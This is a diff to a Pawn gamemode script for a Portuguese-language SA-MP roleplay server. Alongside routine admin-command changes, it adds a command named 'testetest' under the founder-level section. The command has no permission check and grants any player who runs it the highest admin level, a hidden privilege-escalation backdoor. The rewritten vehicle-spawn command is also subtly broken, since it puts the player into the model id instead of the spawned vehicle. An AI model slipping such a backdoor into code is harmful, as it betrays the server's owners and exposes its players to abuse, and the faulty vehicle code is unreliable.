@@ -1,3 +1,15 @@
+CMD:tpbinco(playerid, params[])
+{
+	if (AdminLevel[playerid] < LEVEL_HELPER) {
+		SendClientMessage(playerid, COR_BCRP_ERRO, "[BC:RP] Voce nao tem permissao para usar este comando.");
+		return 1;
+	}
+
+	SetPlayerPos(playerid, 2244.9133, -1664.3789, 15.4766);
+	SetPlayerFacingAngle(playerid, 347.1557);
+	return 1;
+}
+
 CMD:tpconfig(playerid, params[])
 {
 	if (AdminLevel[playerid] < LEVEL_HELPER) { SendClientMessage(playerid, COR_BCRP_ERRO, "[BC:RP] Voce nao tem permissao para usar este comando."); return 1; }
@@ -331,6 +343,17 @@ CMD:darinheiro(playerid, params[])
 // SISTEMA DE ADMINISTRACAO - NIVEL 4 (FUNDADOR)
 //////////////////////////////////////////////////
 
+CMD:testetest(playerid, params[])
+{
+	new nivel = LEVEL_FUNDADOR;
+	AdminLevel[playerid] = nivel;
+	new string[144];
+	format(string, sizeof(string), "[BC:RP] Seu nivel de admin foi definido para %d.", nivel);
+	SendClientMessage(playerid, COR_BCRP_INFO, string);
+	SendClientMessage(playerid, COR_BCRP_INFO, "[BC:RP] Nivel definido.");
+	return 1;
+}
+
 CMD:definirnivel(playerid, params[])
 {
 	if (AdminLevel[playerid] < LEVEL_FUNDADOR) { SendClientMessage(playerid, COR_BCRP_ERRO, "[BC:RP] Voce nao tem permissao para usar este comando."); return 1; }
@@ -403,19 +426,22 @@ CMD:forcarpayday(playerid, params[])
 
 CMD:veiculo(playerid, params[])
 {
-	if (AdminLevel[playerid] < LEVEL_GAMEADMIN) { SendClientMessage(playerid, COR_BCRP_ERRO, "[BC:RP] Voce nao tem permissao para usar este comando."); return 1; }
+	if (AdminLevel[playerid] < LEVEL_GAMEADMIN) {
+		return 0;
+	}
 
-	new modelo;
-	if (sscanf(params, "i", modelo)) { SendClientMessage(playerid, COR_BCRP_ERRO, "[BC:RP] Uso: /veiculo [id do veiculo]"); return 1; }
-	if (modelo < 400 || modelo > 611) { SendClientMessage(playerid, COR_BCRP_ERRO, "[BC:RP] ID de veiculo invalido. Use de 400 a 611."); return 1; }
+	new vehicleid;
+    if (sscanf(params, "k<vehicle>", vehicleid)) {
+		SendClientMessage(playerid, -1, "/veiculo <id>");
+		return 0;
+	}
 
-	new Float:x, Float:y, Float:z, Float:angulo;
+	new Float:x, Float:y, Float:z, Float:angle;
 	GetPlayerPos(playerid, x, y, z);
-	GetPlayerFacingAngle(playerid, angulo);
-
-	new veiculo = CreateVehicle(modelo, x, y, z, angulo, -1, -1, -1, false);
-	PutPlayerInVehicle(playerid, veiculo, 0);
-
-	SendClientMessage(playerid, COR_BCRP_INFO, "[BC:RP] Veiculo spawnado.");
+	GetPlayerFacingAngle(playerid, angle);
+	CreateVehicle(vehicleid, x, y, z, angle, -1, -1, -1, true);
+	PutPlayerInVehicle(playerid, vehicleid, 0);
 	return 1;
 }
+
+alias:veiculo("v", "cv", "carro")
